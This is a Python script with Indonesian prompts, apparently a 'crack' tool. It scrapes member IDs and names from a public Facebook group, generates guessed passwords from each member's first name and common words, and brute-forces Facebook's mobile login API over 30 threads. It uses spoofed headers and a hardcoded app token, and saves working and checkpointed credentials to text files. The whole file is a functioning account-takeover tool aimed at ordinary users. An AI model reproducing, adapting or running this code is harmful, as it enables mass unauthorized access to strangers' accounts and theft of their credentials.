import requests,bs4,re,os,concurrent.futures,sys,random,time
from bs4 import BeautifulSoup as juki
from concurrent.futures import ThreadPoolExecutor
from random import randint

chan = requests.Session()
tamp = []
tunv = []
uid = []
cp = []
ok = []

def banner():
	print('''   _____ __  __ ____  ______
  / ____|  \/  |  _ \|  ____|
 | |    | \  / | |_) | |__
 | |    | |\/| |  _ <|  __|
 | |____| |  | | |_) | |
  \_____|_|  |_|____/|_|

Crack Member Grup Publik No Login ...
Created By : Sptty Chan
Github     : github.com/sptty-chan\n_________________________________________''')

def menu():
	os.system('clear')
	banner()
	print('\n[ 1 ] Dump Grup Dan Mulai Crack')
	print('[ 2 ] Lihat Result Crack')
	pil = input('\n[ S ] Pilih : ')
	if pil=='1' or pil=='01':
		grup()
	elif pil=='2' or pil=='02':
		results()

def results():
	print('\n[ 1 ] Result CP : ')
	print('[ 2 ] Result OK : ')
	pil = input('\n[ S ] Pilih : ')
	if pil=='1' or pil=='01':
		try:
			cj = open('cp.txt','r').read()
		except IOError:
			exit('[ S ] Tidak Ada...')
		print('')
		liat = os.system('cat cp.txt')
		input('\n[ S ] Kembali ')
		menu()
	elif pil=='2' or pil=='02':
		try:
			cj = open('ok.txt','r').read()
		except IOError:
			exit('[ S ] Tidak ada...')
		print('')
		liat = os.system('cat ok.txt')
		input('\n[ S ] Kembali ')
		menu()

def grup():
	id = input("\n[ S ] Id Atau User Name Grup : ")
	ua = 'Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba'
	miskinlu = {"user-agent": ua}
	url = "https://mbasic.facebook.com/groups/"+id
	try:
		gn = juki(chan.get(url, headers=miskinlu).text, "html.parser")
	except requests.exceptions.ConnectionError:
		exit('[ S ] Koneksi Internet Terputus..')
	let = open('chan.txt','w');let.write(str(gn));let.close()
	berr = gn.find("title")
	berr2 = berr.text.replace(" | Facebook","").replace(" Grup Publik","")
	print('\n[ S ] Nama Grup : '+berr2)
	ggs = gn.find_all('table')
	ang = []
	for ff in ggs:
		anggo = ff.text
		bro = anggo.replace('Anggota','')
		try:
			mex = int(bro)
			jumlah = ang.append(mex)
		except:
			pass
	if len(ang)==0:
		print('[ S ] Anggota : -')
	else:
		print('[ S ] Anggota : '+str(ang[0]))
	try:
		jum = int(input('[ S ] Ambil Berapa ID [ Max 2000 ] : '))
		if jum>2000:
			exit('[ S ] Baca Woi Maksimal 2000 ID aja')
		else:
			pass
	except ValueError:
		exit('[ S ] Masukan Angka Jangan Selain Angka.')
	tunv.append(jum)
	print('')
	grup1(url)

def grup1(url):
	ua = 'Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba'
	miskinlu = {"user-agent": ua}
	try:
		set = juki(chan.get(url, headers=miskinlu).text, "html.parser")
	except requests.exceptions.ConnectionError:
		password()
	bf2 = set.find_all('a')
	for g in bf2:
		css = str(g).split('>')
		if 'Lihat Postingan Lainnya</span' in css:
			bcj = str(g).replace('"><span>Lihat Postingan Lainnya</span></a>','')
			bcj1 = bcj.replace('<a href="','')
			bcj2 = bcj1.replace('amp;','')
	tes = set.find_all('table')
	for cari in tes:
		liatnih = cari.text
		spl = liatnih.split(' ')
		if 'mengajukan' in spl:
			idsiapa = re.findall('content_owner_id_new.\w+',str(cari))
			idyou =	idsiapa[0].replace('content_owner_id_new.','')
			namayou = liatnih.replace(' mengajukan pertanyaan .','')
			idku = idyou+'|'+namayou
			if idku in uid:
				continue
			else:
				if int(tunv[0])==int(len(uid)):
					password()
				else:
					uid.append(idku)
					print(('\r[ Proses Mengambil ID '+str(len(uid))+' ]'), end="");sys.stdout.flush()
		elif '>' in spl:
			idsiapa = re.findall('content_owner_id_new.\w+',str(cari))
			idyou =	idsiapa[0].replace('content_owner_id_new.','')
			namayou = liatnih.split(' > ')[0]
			idku = idyou+'|'+namayou
			if idku in uid:
				continue
			else:
				if int(tunv[0])==int(len(uid)):
					password()
				else:
					uid.append(idku)
					print(('\r[ Proses Mengambil ID '+str(len(uid))+' ]'), end="");sys.stdout.flush()
		else:
			continue
	try:
		link_ = bcj2
	except:
		password()
	link2 = "https://mbasic.facebook.com"+bcj2
	grup1(link2)

def password():
	loop = 0
	input('\r[ S ] Mode Pesawat 5 Detik Dan Tekan Enter ')
	pass
	print('\n[ S ] Ress CP => cp.txt')
	print('[ S ] Ress OK => ok.txt')
	print('[ S ] Mode Pesawat 5 Detik Setiap 1-2 Menit\n')
	with ThreadPoolExecutor(max_workers=30) as kintil:
		for list in uid:
			user,pw = list.split('|')
			loop+=1
			wow = pw.split(' ')
			wkwk = wow[0].lower()
			if len(wkwk)<3:
				listku = ['sayang','anjing','katasandi','bismillah','kontol','rahasia']
			else:
				if len(wkwk)<6:
					listku = [wkwk+'123',wkwk+'12345','sayang','anjing','katasandi','bismillah','kontol','rahasia']
				else:
					listku = [wkwk,wkwk+'123',wkwk+'12345','sayang','anjing','katasandi','bismillah','kontol','rahasia']
			kintil.submit(crack,user,listku,loop)
	exit()

def crack(user,listku,loop):
	ua = 'Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba'
	print('\r[ Crack ] %s | %s - CP = %s - OK = %s'%(str(loop),str(len(uid)),str(len(cp)),str(len(ok))), end=' ');sys.stdout.flush()
	for pwku in listku:
		try:
			aku = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
			sayang = 'https://b-api.facebook.com/method/auth.login'
			kamu = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',  'format': 'JSON', 'sdk_version': '2', 'email': user, 'locale': 'en_US', 'password': pwku, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
			ini = requests.get(sayang, params=kamu, headers=aku)
			if 'access_token' in ini.text and 'EAAA' in ini.text:
				akses = ini.json()["access_token"]
				print('\r[ OK ] %s - %s - %'%(user,pwku,akses))
				ok.append(user)
				simpan = open('ok.txt','a');simpan.write(user+' - '+pwku+'\n');simpan.close()
				break
			elif 'www.facebook.com' in ini.json()['error_msg']:
				print('\r[ CP ] %s - %s             '%(user,pwku))
				cp.append(user)
				simpan = open('cp.txt','a');simpan.write(user+' - '+pwku+'\n');simpan.close()
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
menu()
